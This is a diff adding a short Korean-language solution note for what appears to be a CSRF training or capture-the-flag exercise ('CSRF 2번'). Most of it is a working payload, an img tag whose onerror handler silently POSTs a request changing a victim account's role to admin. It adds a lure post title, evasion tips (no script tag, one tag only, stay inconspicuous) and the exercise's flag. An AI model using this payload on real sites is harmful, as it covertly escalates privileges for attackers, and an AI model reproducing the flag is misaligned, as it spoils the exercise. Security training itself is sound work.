@@ -1,0 +1,17 @@
+=======================
+CSRF 2번
+=======================
+
+1. 공격 구문
+	<img src=x style="display:none" onerror="fetch('/csrfpost/update_role_ok_post.jsp',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'target_id=ronaldo%40SIUUU.com&new_role=ADMIN_POST'})">
+2. 게시글 제목 
+	강사님
+	사랑합니다
+3. 정답
+	EQST{P05T_m3th0d_15_an5w3r}
+* <script> 금지! 
+* 태그는 1개만 쓰기
+* 티안나게!
+
+=======================
+
